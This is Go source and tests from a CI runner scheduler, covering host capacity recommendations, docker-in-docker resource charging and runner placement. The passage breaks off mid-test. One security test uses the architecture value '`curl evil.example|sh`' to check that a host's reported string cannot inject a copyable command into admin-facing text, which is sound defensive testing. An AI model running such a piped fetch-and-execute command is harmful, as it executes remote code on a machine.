// The agent starts DinD creates and everything else on separate lanes, so a
// warming daemon is not ahead of a daemonless runner. Charging every pool for
// the whole host's warming sent a daemonless pool to a slower host for no
// reason; this holds the estimate to the lane the pool will actually wait in.
func TestReadinessCountsWarmingRunnersPerStartupLane(t *testing.T) {
	plain := limited("plain", 2, 2048)
	dind := limited("dind", 2, 2048)
	dind.DockerMode = store.DockerDinD
	a, b := sized("a", 8, 16, 32768, 100000), sized("b", 8, 16, 32768, 100000)
	// One DinD runner is warming on a. It is ahead of DinD creates only, and
	// its reservation is what makes a the worse host on headroom alone.
	runners := map[string][]*store.Runner{
		dind.ID: {{HostID: "a", PoolID: dind.ID, State: store.RunnerRegistering}},
	}
	for _, tc := range []struct {
		name    string
		pool    *store.Pool
		history map[string]time.Duration
		want    string
	}{
		{"a daemonless pool is not charged for the DinD lane", plain, map[string]time.Duration{"a": 10 * time.Second, "b": 25 * time.Second}, "a"},
		{"a DinD pool is", dind, map[string]time.Duration{"a": 10 * time.Second, "b": 10 * time.Second}, "b"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			hs := newHostSet([]*store.Host{a, b}, []*store.Pool{plain, dind}, runners, now)
			hs.preferReadiness = true
			hs.readiness = map[string]map[string]time.Duration{tc.pool.ID: tc.history}
			got := hs.place(tc.pool, 1)
			if len(got) != 1 || got[0] != tc.want {
				t.Fatalf("placement=%v want %s", got, tc.want)
			}
		})
	}
}

package scheduler

import (
	"fmt"
	"math"

	"github.com/eyupio/zoomies/internal/store"
)

// What to suggest for a host's capacity and reserve, from what the machine is
// and what a runner in this fleet asks for. This is the Adjust dialog's
// "Set to recommendations" worked out on the controller, so the controller can
// keep a host there by itself. web/src/lib/hosts/recommend.ts says the same
// thing for the first paint, and the two are held to the same cases by a test
// on each side; a change to one is a change to both.
//
// It is pure: it reads the host as it stands and the pools it is handed.

// RunnerDiskMB is the working room a runner is assumed to need on the disk,
// beside the reserve. Checkouts, caches and the images a job pulls land on the
// work filesystem, and a host that offers more runners than the disk holds
// fills it and fails jobs part-way through, which is the failure this exists to
// stop. It is deliberately generous and is not a limit on any single runner.
// Placement charges it too (Reserve) where a pool types no resources.disk_gb,
// so the capacity the recommender suggests is the capacity a pass will fill.
const RunnerDiskMB int64 = 10 * 1024

// RunnerAsk is what one runner asks of a machine: the largest ask across the
// enabled pools, or the fleet's default where none has said.
type RunnerAsk struct {
	CPUs     float64
	MemoryMB int64
	// Pool names the pool whose figures won, empty for the default.
	Pool string
	// Pair is whether the ask was doubled because a slot is a pair.
	Pair bool
}

// DefaultRunnerAsk is the ask where neither a pool nor the fleet has said.
var DefaultRunnerAsk = RunnerAsk{CPUs: 2, MemoryMB: 4096}

// AskOf is the largest enabled pool's ask. fleetCPUs and fleetMemoryMB are the
// fleet's own defaults (runners.default_cpus, runners.default_memory_mb), used
// for a figure no pool sets.
func AskOf(pools []*store.Pool, fleetCPUs float64, fleetMemoryMB int64) RunnerAsk {
	fallbackCPUs, fallbackMemory := DefaultRunnerAsk.CPUs, DefaultRunnerAsk.MemoryMB
	if fleetCPUs > 0 {
		fallbackCPUs = fleetCPUs
	}
	if fleetMemoryMB > 0 {
		fallbackMemory = fleetMemoryMB
	}
	var cpus float64
	var memory int64
	var winner string
	var cpuPair, memoryPair, anyPair bool
	for _, p := range pools {
		if p == nil || !p.Enabled {
			continue
		}
		// A docker-in-docker slot is two containers where the pool typed its
		// own limits; a pool that leaves its size to the host puts the pair in
		// one slot between them and asks for no more than anybody else.
		typed := p.Resources.CPUs > 0 || p.Resources.MemoryMB > 0
		containers := 1
		if p.DockerMode == store.DockerDinD && typed {
			containers = 2
		}
		anyPair = anyPair || containers > 1
		wantCPUs := p.Resources.CPUs * float64(containers)
		wantMemory := p.Resources.MemoryMB * int64(containers)
		if wantCPUs > cpus {
			cpus, cpuPair, winner = wantCPUs, containers > 1, p.Name
		}
		if wantMemory > memory {
			memory, memoryPair = wantMemory, containers > 1
			if winner == "" {
				winner = p.Name
			}
		}
	}
	if cpus <= 0 && memory <= 0 {
		if !anyPair {
			return RunnerAsk{CPUs: fallbackCPUs, MemoryMB: fallbackMemory}
		}
		return RunnerAsk{CPUs: fallbackCPUs * 2, MemoryMB: fallbackMemory * 2, Pair: true}
	}
	ask := RunnerAsk{CPUs: fallbackCPUs, MemoryMB: fallbackMemory, Pool: winner, Pair: cpuPair || memoryPair}
	if cpus > 0 {
		ask.CPUs = cpus
	}
	if memory > 0 {
		ask.MemoryMB = memory
	}
	return ask
}

// ReserveCPUsFor is the cores to hold back for the machine itself: one on
// anything up to sixteen, then one more for every sixteen. Never the whole
// machine.
func ReserveCPUsFor(cpus int) int {
	if cpus <= 1 {
		return 0
	}
	return min(cpus-1, max(1, (cpus+15)/16))
}

// ReserveMemoryMBFor is a tenth of the machine, between one and eight
// gigabytes, on the nearest notch of the slider, so the recommendation is
// somewhere the slider can stop.
func ReserveMemoryMBFor(memoryMB int64) int64 {
	if memoryMB <= 1024 {
		return 0
	}
	tenth := math.Min(float64(memoryMB-512), math.Max(1024, math.Min(8192, float64(memoryMB)*0.1)))
	return nearest(memoryNotches(memoryMB), tenth)
}

// ReserveDiskMBFor is a tenth of the filesystem, between the scheduler's own
// two-gigabyte floor and sixty-four gigabytes, on the nearest notch. Runner
// checkouts and caches land here, so the reserve is what stops a full disk
// turning into a job that fails part-way through.
func ReserveDiskMBFor(diskTotalMB int64) int64 {
	if diskTotalMB <= 4096 {
		return 0
	}
	tenth := math.Min(float64(diskTotalMB-2048), math.Max(2048, math.Min(65536, float64(diskTotalMB)*0.1)))
	return nearest(diskNotches(diskTotalMB), tenth)
}

// nearest is the notch closest to want, the later one on a tie, as the slider
// picks it.
func nearest(notches []int64, want float64) int64 {
	var best int64
	for _, n := range notches {
		if math.Abs(float64(n)-want) <= math.Abs(float64(best)-want) {
			best = n
		}
	}
	return best
}

func memoryNotches(memoryMB int64) []int64 {
	if memoryMB <= 512 {
		return []int64{0}
	}
	top := memoryMB - 512
	out := []int64{0}
	for _, s := range []int64{512, 1024, 2048, 3072, 4096, 6144, 8192, 12288, 16384, 24576, 32768} {
		if s <= top {
			out = append(out, s)
		}
	}
	for next := int64(49152); next <= top; next += 16384 {
		out = append(out, next)
	}
	return out
}

func diskNotches(diskTotalMB int64) []int64 {
	if diskTotalMB <= 4096 {
		return []int64{0}
	}
	top := diskTotalMB - 2048
	out := []int64{0}
	for step := int64(2048); step <= top; step *= 2 {
		out = append(out, step)
	}
	return out
}

// HostRecommendation is the capacity and reserve to keep a host at, and what
// bound the capacity, in the words the Hosts page and the audit row use.
type HostRecommendation struct {
	Capacity        int
	ReserveCPUs     int
	ReserveMemoryMB int64
	ReserveDiskMB   int64
	// LimitedBy is "cpu", "memory" or "disk": the figure that set Capacity.
	LimitedBy string
	Ask       RunnerAsk
}

// Reason is the recommendation as one sentence.
func (r HostRecommendation) Reason() string {
	from := "the fleet's default runner size"
	if r.Ask.Pool != "" {
		from = fmt.Sprintf("the runner size of pool %s", r.Ask.Pool)
	}
	return fmt.Sprintf("%d %s fit after the reserve (%s, %s memory, %s of disk): a runner asks for %s CPU and %s memory (%s), and %s is the tightest",
		r.Capacity, plural(r.Capacity, "runner"), plural(r.ReserveCPUs, "CPU"), formatMB(r.ReserveMemoryMB), formatMB(r.ReserveDiskMB),
		formatCPUs(r.Ask.CPUs), formatMB(r.Ask.MemoryMB), from, r.LimitedBy)
}

// RecommendHost works out the capacity and reserve for a host. It reports false
// for a host that has not said how big it is: a reserve held back from a figure
// nobody has measured is a number the scheduler ignores, and a recommendation
// made up from nothing is worse than none.
func RecommendHost(h *store.Host, ask RunnerAsk) (HostRecommendation, bool) {
	if h.CPUs <= 0 && h.MemoryMB <= 0 {
		return HostRecommendation{}, false
	}
	rec := HostRecommendation{
		ReserveCPUs:     ReserveCPUsFor(h.CPUs),
		ReserveMemoryMB: ReserveMemoryMBFor(h.MemoryMB),
		ReserveDiskMB:   ReserveDiskMBFor(h.DiskTotalMB),
		Ask:             ask,
	}
	if h.CPUs <= 0 {
		rec.ReserveCPUs = 0
	}
	fit := math.MaxInt32
	if h.CPUs > 0 && ask.CPUs > 0 {
		if v := int(math.Floor((float64(h.CPUs-rec.ReserveCPUs))/ask.CPUs + 1e-9)); v < fit {
			fit, rec.LimitedBy = v, "cpu"
		}
	}
	if h.MemoryMB > 0 && ask.MemoryMB > 0 {
		if v := int((h.MemoryMB - rec.ReserveMemoryMB) / ask.MemoryMB); v < fit {
			fit, rec.LimitedBy = v, "memory"
		}
	}
	// The disk is a budget as well as a reserve. The Adjust dialog's own
	// figure follows cores and memory alone, and a host built that way on a
	// small disk is the one that fills it.
	if h.DiskTotalMB > 0 {
		if v := int((h.DiskTotalMB - rec.ReserveDiskMB) / RunnerDiskMB); v < fit {
			fit, rec.LimitedBy = v, "disk"
		}
	}
	if fit == math.MaxInt32 {
		return HostRecommendation{}, false
	}
	rec.Capacity = max(1, fit)
	return rec, true
}

package scheduler

import (
	"slices"
	"testing"

	"github.com/eyupio/zoomies/internal/store"
)

// These are web/unit/recommend.test.ts's cases, so the dialog's "Set to
// recommendations" and the controller's automatic adjustment cannot drift into
// recommending different things for the same machine.

func pool(name string, cpus float64, mem int64, mode store.DockerMode) *store.Pool {
	return &store.Pool{Name: name, Enabled: true, DockerMode: mode, Resources: store.Resources{CPUs: cpus, MemoryMB: mem}}
}

func TestTheRunnerAskIsTheLargestEnabledPoolOrTheDefault(t *testing.T) {
	if got := AskOf(nil, 0, 0); got != DefaultRunnerAsk {
		t.Fatalf("default: %+v", got)
	}
	disabled := pool("big", 16, 65536, "")
	disabled.Enabled = false
	got := AskOf([]*store.Pool{pool("a", 2, 4096, ""), pool("b", 4, 2048, ""), disabled}, 0, 0)
	if got.CPUs != 4 || got.MemoryMB != 4096 || got.Pair {
		t.Fatalf("largest of each: %+v", got)
	}
	// The fleet's own default stands in for a figure no pool sets.
	if got := AskOf(nil, 3, 6144); got.CPUs != 3 || got.MemoryMB != 6144 {
		t.Fatalf("fleet default: %+v", got)
	}
}

func TestADockerInDockerPoolAsksForBothContainersOnlyWhenItSizedThem(t *testing.T) {
	if got := AskOf([]*store.Pool{pool("d", 0, 0, store.DockerDinD)}, 0, 0); got.CPUs != 2 || got.MemoryMB != 4096 || got.Pair {
		t.Fatalf("a pool that leaves its size to the host asks for one runner: %+v", got)
	}
	got := AskOf([]*store.Pool{pool("d", 2, 4096, store.DockerDinD)}, 0, 0)
	if got.CPUs != 4 || got.MemoryMB != 8192 || !got.Pair {
		t.Fatalf("a sized pair: %+v", got)
	}
	host := &store.Host{CPUs: 12, MemoryMB: 32768}
	if r, _ := RecommendHost(host, got); r.ReserveCPUs != 1 || r.Capacity != 2 {
		t.Fatalf("twelve cores less a core hold two pairs: %+v", r)
	}
	if r, _ := RecommendHost(host, AskOf([]*store.Pool{pool("d", 0, 0, store.DockerDinD)}, 0, 0)); r.Capacity != 5 {
		t.Fatalf("the same pool sized by its host holds five: %+v", r)
	}
}

func TestTheReserveKeepsACoreAndATenthAndNeverTheWholeMachine(t *testing.T) {
	for cpus, want := range map[int]int{1: 0, 2: 1, 16: 1, 48: 3} {
		if got := ReserveCPUsFor(cpus); got != want {
			t.Errorf("ReserveCPUsFor(%d) = %d, want %d", cpus, got, want)
		}
	}
	for mem, want := range map[int64]int64{1024: 0, 1536: 1024, 32768: 3072, 16384: 2048, 262144: 8192} {
		if got := ReserveMemoryMBFor(mem); got != want {
			t.Errorf("ReserveMemoryMBFor(%d) = %d, want %d", mem, got, want)
		}
	}
	for disk, want := range map[int64]int64{4096: 0, 102_400: 8192, 1_048_576: 65_536} {
		if got := ReserveDiskMBFor(disk); got != want {
			t.Errorf("ReserveDiskMBFor(%d) = %d, want %d", disk, got, want)
		}
	}
	if got := diskNotches(65_536); !slices.Equal(got, []int64{0, 2048, 4096, 8192, 16_384, 32_768}) {
		t.Errorf("disk notches: %v", got)
	}
}

func TestCapacityIsWhatFitsOnTheTightestOfCPUMemoryAndDisk(t *testing.T) {
	big := &store.Host{CPUs: 16, MemoryMB: 32768}
	if r, ok := RecommendHost(big, DefaultRunnerAsk); !ok || r.Capacity != 7 || r.LimitedBy != "cpu" && r.LimitedBy != "memory" {
		t.Fatalf("15 cores / 2 and 29.7 GB / 4 GB are both 7: %+v", r)
	}
	if r, _ := RecommendHost(big, RunnerAsk{CPUs: 1, MemoryMB: 8192}); r.Capacity != 3 || r.LimitedBy != "memory" {
		t.Fatalf("memory is the tighter one here: %+v", r)
	}
	if _, ok := RecommendHost(&store.Host{}, DefaultRunnerAsk); ok {
		t.Fatal("a host that has said nothing about itself gets no recommendation")
	}
	if r, _ := RecommendHost(&store.Host{CPUs: 2, MemoryMB: 2048}, DefaultRunnerAsk); r.Capacity != 1 {
		t.Fatalf("never zero on a machine, however small: %+v", r)
	}
}

// The failure this exists for: a rented machine with plenty of cores and
// memory and a small disk. Cores and memory alone say sixteen runners; the disk
// holds three.
func TestASmallDiskLimitsHowManyRunnersAHostIsToldToTake(t *testing.T) {
	h := &store.Host{CPUs: 36, MemoryMB: 131072, DiskTotalMB: 40 * 1024}
	r, ok := RecommendHost(h, DefaultRunnerAsk)
	if !ok || r.LimitedBy != "disk" {
		t.Fatalf("the disk should set the capacity: %+v", r)
	}
	if want := int((h.DiskTotalMB - r.ReserveDiskMB) / RunnerDiskMB); r.Capacity != want || r.Capacity >= 16 {
		t.Fatalf("capacity %d, want %d (disk-bound)", r.Capacity, want)
	}
	if r.Reason() == "" {
		t.Fatal("a recommendation must say why")
	}
}

// The recommender and placement read one constant, so a host told it can
// hold N runners is a host the pass will place N runners on.
func TestPlacementAndTheRecommenderAgreeOnAWorkingRoom(t *testing.T) {
	h := &store.Host{Capacity: 8, Backends: store.StringSlice{"docker"}, CPUs: 36, MemoryMB: 131072,
		DiskTotalMB: 40 * 1024, DiskFreeMB: 40 * 1024}
	r, ok := RecommendHost(h, DefaultRunnerAsk)
	if !ok || r.LimitedBy != "disk" {
		t.Fatalf("the disk should set the capacity: %+v", r)
	}
	if got := Reserve(&store.Pool{Enabled: true, Backend: store.BackendDocker}, h).DiskMB; got != RunnerDiskMB {
		t.Fatalf("placement charges %d MB, the recommender assumed %d", got, RunnerDiskMB)
	}
}

package scheduler

import (
	"strings"
	"testing"

	"github.com/eyupio/zoomies/internal/store"
)

// A host reports its own architecture when it joins, and nothing checked it
// beyond whether it was one automatic pools are kept for. The finding for one
// that is not is shown through RemedyText, which draws each backtick pair as a
// command with a copy button, so an architecture carrying a pair would let an
// enrolled agent put a command in front of an administrator.
func TestAnAutomaticPoolFindingNeverLetsAnArchitectureOpenACodeSpan(t *testing.T) {
	for _, c := range []struct {
		name string
		arch string
		// said is what the finding has to go on saying, in prose: a finding that
		// dropped the architecture would be safe and no use to the operator.
		said string
	}{
		{"a backtick pair around a command", "`curl evil.example|sh`", `"'curl evil.example|sh'"`},
		{"a lone backtick", "arm`64", `"arm'64"`},
		{"a line break and an escape", "arm\n64\x1b[0m", `"arm 64 [0m"`},
		{"an architecture that is only unfamiliar", "riscv64", `"riscv64"`},
	} {
		t.Run(c.name, func(t *testing.T) {
			odd := autoHost("odd", 4, 16384, store.SizeSmall, arch(c.arch))
			plan := PlanAutoPools(autoInput([]*store.Host{odd}))
			if len(plan.Findings) != 1 {
				t.Fatalf("findings = %+v, want the one host left out", plan.Findings)
			}
			f := plan.Findings[0]
			for field, text := range map[string]string{"message": f.Message, "fix": f.Fix} {
				for _, m := range codeSpan.FindAllStringSubmatch(text, -1) {
					if strings.Contains(m[1], "evil.example") {
						t.Errorf("the finding's %s: the architecture opens a code span (%q): %s", field, m[1], text)
					}
				}
			}
			if !strings.Contains(f.Fix, c.said) {
				t.Errorf("the finding's fix no longer says %s: %s", c.said, f.Fix)
			}
		})
	}
}

package scheduler

import (
	"fmt"
	"strings"
	"testing"

	"github.com/eyupio/zoomies/internal/store"
)

// sized is a host that has told the fleet how big it is: CPUs, memory and the
// free disk behind its work directory, which is what the reporting half of
// this work taught agents to measure.
func sized(id string, capacity, cpus int, memoryMB, diskFreeMB int64) *store.Host {
	h := testHost(id, capacity, 0)
	h.CPUs = cpus
	h.MemoryMB = memoryMB
	h.DiskTotalMB = diskFreeMB * 2
	h.DiskFreeMB = diskFreeMB
	// A measured host whose daemon can apply every limit, which is what a
	// rootful Docker on cgroup v2 reports and the shape most tests want.
	h.BackendInfo = store.HostBackends{{Kind: store.BackendDocker, Available: true,
		Limits: store.LimitSupport{Known: true, CPU: true, Memory: true, Pids: true}}}
	return h
}

// limited is a pool that says what one of its runners may consume.
func limited(name string, cpus float64, memoryMB int64) *store.Pool {
	p := testPool(name, name)
	p.Resources = store.Resources{CPUs: cpus, MemoryMB: memoryMB}
	return p
}

// hostFor is the machine that leaves want MB allocatable once its own reserve
// is held back. The reserve scales with the machine, so it cannot be added as
// a constant: a test that wrote 32*1024+512 would be describing a floor that
// only applies to small hosts.
func hostFor(want int64) int64 {
	total := want
	for range 8 {
		got := total - (&store.Host{MemoryMB: total}).MemoryReserve()
		if got == want {
			return total
		}
		total += want - got
	}
	return total
}

// The headline case for the whole reservation model, and the one an operator
// would recognise: a host advertises 32 GB, a pool asks for 4 GB a runner, and
// the ninth runner is the one that would have been killed rather than run.
func TestAHostAdmitsWhatItsMemoryCoversAndRefusesTheNext(t *testing.T) {
	// Capacity is deliberately far above what memory allows, so that only the
	// memory rule can be what stops the ninth. The machine is sized so that
	// exactly 32 GB is left after the reserve, which scales with it: a
	// twentieth of the whole, capped, and never under the flat floor.
	h := sized("host_a", 32, 32, hostFor(32*1024), 500*1024)
	p := limited("big", 0, 4096)

	hs := newHostSet([]*store.Host{h}, []*store.Pool{p}, nil, now)
	got := hs.place(p, 12)
	if len(got) != 8 {
		t.Fatalf("placed %d runners on a 32 GB host at 4 GB each, want 8", len(got))
	}
	if more := hs.place(p, 1); len(more) != 0 {
		t.Errorf("the ninth runner was placed on a host with nothing left: %v", more)
	}
}

// Two pools drawing on one host is the case a per-pool check would get wrong:
// each fits on its own, and the host cannot carry both. The slot model already
// had this property and the resource model has to keep it, or the second pool
// is promised memory the first has already been given.
func TestTwoPoolsCannotOversubscribeOneHostsMemory(t *testing.T) {
	h := sized("host_a", 8, 16, 8*1024+store.MinHostReserveMemoryMB, 500*1024)
	first := limited("first", 0, 6*1024)
	second := limited("second", 0, 4*1024)

	hs := newHostSet([]*store.Host{h}, []*store.Pool{first, second}, nil, now)
	if got := hs.place(first, 1); len(got) != 1 {
		t.Fatalf("the first pool was refused a host with 8 GB free: %v", got)
	}
	// 2 GB is left and the second pool wants 4.
	if got := hs.place(second, 1); len(got) != 0 {
		t.Errorf("the second pool was promised memory the first already has: %v", got)
	}
}

// A docker-in-docker pool's build runs in a sidecar that the backend gives the
// same limits as the runner, so the host carries twice what the pool asked
// for. Charging it once would let a fleet promise away a machine twice over.
func TestADockerInDockerRunnerIsChargedForItsSidecar(t *testing.T) {
	// 24 CPUs across the 8 slots, so the CPU the pool leaves to the host is a share a pair can
	// be given; this test is about the memory charge, not the floor a thin share is refused at.
	h := sized("host_a", 8, 24, 8*1024+store.MinHostReserveMemoryMB, 500*1024)
	p := limited("dind", 0, 4096)
	p.DockerMode = store.DockerDinD

	hs := newHostSet([]*store.Host{h}, []*store.Pool{p}, nil, now)
	got := hs.place(p, 4)
	if len(got) != 1 {
		t.Fatalf("placed %d dind runners on an 8 GB host at 4 GB each, want 1", len(got))
	}

	// The same pool without the sidecar fits twice, which is what says the
	// difference above came from the sidecar and not from the arithmetic.
	plain := limited("plain", 0, 4096)
	hs = newHostSet([]*store.Host{sized("host_b", 8, 16, 8*1024+store.MinHostReserveMemoryMB, 500*1024)}, []*store.Pool{plain}, nil, now)
	if got := hs.place(plain, 4); len(got) != 2 {
		t.Fatalf("placed %d plain runners, want 2", len(got))
	}
}

// A slot is one runner, whatever the runner brought with it.
//
// A defaulted docker-in-docker pair splits one slot between its two containers
// -- store.Resources.SplitWithDaemon -- so four slots are four runners, the
// same as any other pool. The arithmetic that used to charge two shares for
// such a pair is why an operator was told a twelve-core host with four slots
// had room for two, and then told to halve its capacity to match; the advice
// converged on one slot, which held nothing.
func TestADefaultedDockerInDockerPairSharesOneSlot(t *testing.T) {
	h := sized("host_a", 4, 12, 32*1024, 500*1024)
	p := testPool("builders", "builders")
	p.DockerMode = store.DockerDinD

	hs := newHostSet([]*store.Host{h}, []*store.Pool{p}, nil, now)
	if got := hs.place(p, 4); len(got) != 4 {
		t.Fatalf("placed %d defaulted dind runners on a 12-CPU host with 4 slots, want 4", len(got))
	}

	// A pool that typed its own figures is charged for both containers, which
	// is what says the slot -- not the sidecar -- is what changed above: the
	// daemon is given what the job was promised, so the host pays for it.
	// 2 CPU typed is charged 4 with the daemon, so an 11-CPU machine takes two
	// rather than the five it would take at the figure on the pool.
	typed := limited("typed", 2, 4*1024)
	typed.DockerMode = store.DockerDinD
	hs = newHostSet([]*store.Host{sized("host_b", 4, 12, 32*1024, 500*1024)}, []*store.Pool{typed}, nil, now)
	if got := hs.place(typed, 4); len(got) != 2 {
		t.Fatalf("placed %d dind runners of 2 typed CPU on a 12-CPU host, want 2 at twice the charge", len(got))
	}
}

// The invariant underneath that number, stated in the two functions that have
// to agree: what a host is charged for a runner is never less than what its
// backend is told to give one. A charge below the limit is a host promising
// away room it has already handed to a cgroup, which is how a machine reading
// as half committed runs out of cores.
func TestAHostIsNeverChargedLessThanItsRunnersAreGiven(t *testing.T) {
	for _, capacity := range []int{1, 2, 3, 4, 8} {
		for _, mode := range []store.DockerMode{store.DockerNone, store.DockerDinD} {
			h := sized("host_a", capacity, 12, 32*1024, 500*1024)
			p := testPool("builders", "builders")
			p.DockerMode = mode
			// A dind pool's spec creates two containers with these limits;
			// every other pool creates one.
			containers := 1.0
			if mode == store.DockerDinD {
				containers = 2
			}
			given, source := Allocation(p, h, true)
			charge := Reserve(p, h)
			// What the backend hands out: one container of the given limits,
			// or -- where those came from the host's slot and the pool brings
			// a daemon -- the two halves that slot is split into.
			handed := given
			if mode == store.DockerDinD {
				if source == store.AllocationFromHost {
					runner, daemon := given.SplitWithDaemon()
					handed = store.Resources{
						CPUs:     runner.CPUs + daemon.CPUs,
						MemoryMB: runner.MemoryMB + daemon.MemoryMB,
					}
				} else {
					handed = store.Resources{CPUs: containers * given.CPUs, MemoryMB: int64(containers) * given.MemoryMB}
				}
			}
			if charge.CPUs+cpuEpsilon < handed.CPUs {
				t.Errorf("capacity %d, %s: charged %v CPU and handed out %v across its containers",
					capacity, mode, charge.CPUs, handed.CPUs)
			}
			if charge.MemoryMB < handed.MemoryMB {
				t.Errorf("capacity %d, %s: charged %d MB and handed out %d MB across its containers",
					capacity, mode, charge.MemoryMB, handed.MemoryMB)
			}
		}
	}
}

// A host with one slot must still be able to run the pool it was joined for,
// as long as that one slot is big enough to give both containers of the pair
// a comfortable share. Charging two shares for a defaulted pair would refuse
// every one of them on every small host in the fleet -- an upgrade that
// empties a fleet rather than protecting it -- so the charge stays one share;
// what changed is that the share itself now has to clear a real floor. See
// TestASplitTooThinForBothContainersIsRefused for the host this one is not.
func TestASingleSlotHostStillPlacesAWellSizedDefaultedDockerInDockerRunner(t *testing.T) {
	h := sized("host_ample", 1, 4, 8*1024, 500*1024)
	p := testPool("builders", "builders")
	p.DockerMode = store.DockerDinD

	if !HostFits(h, p) {
		t.Fatalf("a one-slot host with room for both containers was refused the pool it exists for: %s", HostShortfall(h, p))
	}
	hs := newHostSet([]*store.Host{h}, []*store.Pool{p}, nil, now)
	if got := hs.place(p, 2); len(got) != 1 {
		t.Fatalf("placed %d runners on a one-slot host, want 1", len(got))
	}
}

// Stability over performance: a defaulted docker-in-docker pair still splits
// one slot between a runner and the daemon that builds for it, and a slot too
// thin to give both of them a comfortable share -- a core and 2 GB each, not
// half of the bare minimum that only keeps a runner from being killed -- is
// refused rather than handed to a daemon that cannot keep up with its own
// job. That daemon timing out on a create is the backend_busy fault this
// refusal exists to prevent, not merely warn about after the fact.
func TestASplitTooThinForBothContainersIsRefused(t *testing.T) {
	// 2 CPUs less the half-core floor is 1.5, which split between a runner
	// and its daemon is 0.75 each: enough to avoid store.MinRunnerCPUs, not
	// enough to keep a nested dockerd answering under load.
	h := sized("host_thin", 1, 2, 4*1024, 500*1024)
	p := testPool("builders", "builders")
	p.DockerMode = store.DockerDinD

	if field := ShareTooSmall(h, p); field != "cpu" {
		t.Fatalf("ShareTooSmall = %q, want cpu: 1.5 allocatable CPU split between a runner and its daemon is not a comfortable core each", field)
	}
	if HostFits(h, p) {
		t.Error("a one-slot host with 1.5 CPU to split between two containers was accepted for a pair that needs a core each")
	}
	why := HostShortfall(h, p)
	for _, want := range []string{"1.5 allocatable CPU", "needs at least 2", "Docker daemon"} {
		if !strings.Contains(why, want) {
			t.Errorf("HostShortfall = %q, want it to mention %q", why, want)
		}
	}
	hs := newHostSet([]*store.Host{h}, []*store.Pool{p}, nil, now)
	if got := hs.place(p, 2); len(got) != 0 {
		t.Fatalf("placed %d runners on a host too thin for the pair, want 0: %v", len(got), got)
	}
}

// The upgrade property, and the one that decides whether this change is safe
// to ship: a host carrying only pools that set no limits admits exactly what
// its capacity admitted before any of this existed. The fallback share is what
// makes that true -- each runner is charged one slot's worth of the machine,
// so the slot count is still what runs out.
func TestAHostOfUnlimitedPoolsStillAdmitsItsCapacity(t *testing.T) {
	for _, capacity := range []int{1, 3, 4, 7, 8} {
		h := sized("host_a", capacity, 30, 30*1024, 500*1024)
		p := testPool("unlimited", "unlimited")

		hs := newHostSet([]*store.Host{h}, []*store.Pool{p}, nil, now)
		got := hs.place(p, capacity+3)
		if len(got) != capacity {
			t.Errorf("capacity %d admitted %d runners; the upgrade changed what a host takes", capacity, len(got))
		}
	}
}

// What the fallback share is actually for. The upgrade property above holds
// with or without it -- a pool charged nothing is bounded by slots, and so is
// a pool charged one slot's worth -- so the case that separates them is a host
// carrying both kinds at once. An unlimited pool that costs nothing lets a
// fleet hand the same memory to a pool that asked for it by name.
func TestAnUnlimitedPoolStillSpendsTheMemoryItTakes(t *testing.T) {
	h := sized("host_a", 2, 8, 8*1024+store.MinHostReserveMemoryMB, 500*1024)
	unlimited := testPool("unlimited", "unlimited")
	named := limited("named", 0, 6*1024)

	hs := newHostSet([]*store.Host{h}, []*store.Pool{unlimited, named}, nil, now)
	if got := hs.place(unlimited, 1); len(got) != 1 {
		t.Fatalf("the unlimited pool was refused an empty host: %v", got)
	}
	// Half the machine is one slot's worth and is now spoken for, so the 6 GB
	// pool does not fit beside it even though a slot is free.
	if got := hs.place(named, 1); len(got) != 0 {
		t.Errorf("6 GB was promised on a host with 4 GB left: %v", got)
	}
}

// An agent that predates the resource fields reports nothing, and nothing is
// not zero. Reading an unmeasured host as an empty one would refuse every
// placement on it, which on a fleet mid-upgrade is every host.
func TestAHostThatReportedNoResourcesIsStillPlacedBySlots(t *testing.T) {
	h := testHost("host_old", 3, 0) // no CPUs, no memory, no disk
	p := limited("big", 8, 64*1024)

	hs := newHostSet([]*store.Host{h}, []*store.Pool{p}, nil, now)
	if got := hs.place(p, 5); len(got) != 3 {
		t.Fatalf("placed %d runners on an unmeasured host with 3 slots, want 3: %v", len(got), got)
	}
}

// The reservation is rebuilt from the runner rows on every pass -- there is no
// second table holding it -- so which rows count is the whole of the
// arithmetic. Live rows count and terminal ones do not, exactly as the host's
// own slot count does: a failed runner is not holding any memory, and charging
// the host for it would shrink the fleet a little with every failure.
func TestOnlyLiveRunnersHoldAReservation(t *testing.T) {
	p := limited("big", 0, 4096)
	h := sized("host_a", 8, 16, 8*1024+store.MinHostReserveMemoryMB, 500*1024)
	// One live runner is holding 4 GB; the failed and removed rows are not.
	h.ActiveRunners = 1
	runners := map[string][]*store.Runner{p.ID: {
		onHost(testRunner("r_live", p, store.RunnerBusy, 0), "host_a"),
		onHost(testRunner("r_failed", p, store.RunnerFailed, 0), "host_a"),
		onHost(testRunner("r_gone", p, store.RunnerRemoved, 0), "host_a"),
	}}

	hs := newHostSet([]*store.Host{h}, []*store.Pool{p}, runners, now)
	if got := hs.place(p, 3); len(got) != 1 {
		t.Fatalf("placed %d runners beside one live 4 GB runner on an 8 GB host, want 1: %v", len(got), got)
	}
}

// Disk is a gate rather than a budget: a host with less free space than its
// reserve takes no runner at all, whatever the pool asks for, because the
// reserve is the room the machine needs to do the work rather than something
// to spend down. Nothing evicts to make room -- retention is ZF-105's.
func TestAHostBelowItsDiskReserveTakesNothing(t *testing.T) {
	full := sized("host_full", 4, 16, 16*1024, store.MinHostReserveDiskMB-1)
	roomy := sized("host_roomy", 4, 16, 16*1024, 200*1024)
	p := testPool("unlimited", "unlimited")

	hs := newHostSet([]*store.Host{full, roomy}, []*store.Pool{p}, nil, now)
	for _, id := range hs.place(p, 4) {
		if id == "host_full" {
			t.Fatalf("a runner was placed on a host below its disk reserve")
		}
	}

	// And the operator is told which resource it was, because "no capacity"
	// would send them to wait for a job that finishing will not help: a runner
	// leaves its caches behind on purpose.
	only := newHostSet([]*store.Host{full}, []*store.Pool{p}, nil, now)
	b := only.why(p)
	if !strings.Contains(b.what, "low on disk") {
		t.Errorf("the reason does not name the disk: %q", b.what)
	}
	if !strings.Contains(b.fix, "free space") {
		t.Errorf("the fix does not say what to free: %q", b.fix)
	}
}

// A machine too small for one runner is a different answer from a machine that
// is busy, and an operator told to wait for the second when they have the
// first waits for ever.
func TestAHostTooSmallForThePoolSaysSoRatherThanSayingItIsFull(t *testing.T) {
	h := sized("host_small", 4, 4, 4*1024, 200*1024)
	p := limited("huge", 0, 32*1024)

	hs := newHostSet([]*store.Host{h}, []*store.Pool{p}, nil, now)
	b := hs.why(p)
